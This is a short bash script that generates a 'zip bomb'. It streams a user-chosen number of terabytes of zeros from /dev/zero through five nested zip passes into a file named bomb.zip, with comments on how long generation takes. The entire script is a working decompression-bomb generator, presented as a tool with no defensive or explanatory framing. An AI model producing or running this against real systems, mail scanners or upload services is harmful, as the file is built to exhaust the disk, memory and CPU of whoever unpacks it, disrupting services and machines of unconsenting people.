#!/bin/bash
 
# Note that creating this zip will take a long time.
# On my PC, it takes about 2 hours per TB. (3.46 GHz)
# The bottleneck is per core CPU speed for zip. (zip doesn't thread)
 
ZFILE="bomb.zip"
 
if [ "$1" == "" ]; then
	echo "Usage: ${ARG0} [deflate size in TB]"
	exit -1
fi
 
SIZE=$((1000000000*$1))
echo "Deflate size: ${1} TB"
echo "File: `pwd`/${ZFILE}"
 
dd if=/dev/zero bs=1000 count=$SIZE | zip | zip | zip | zip | zip > $ZFILE
 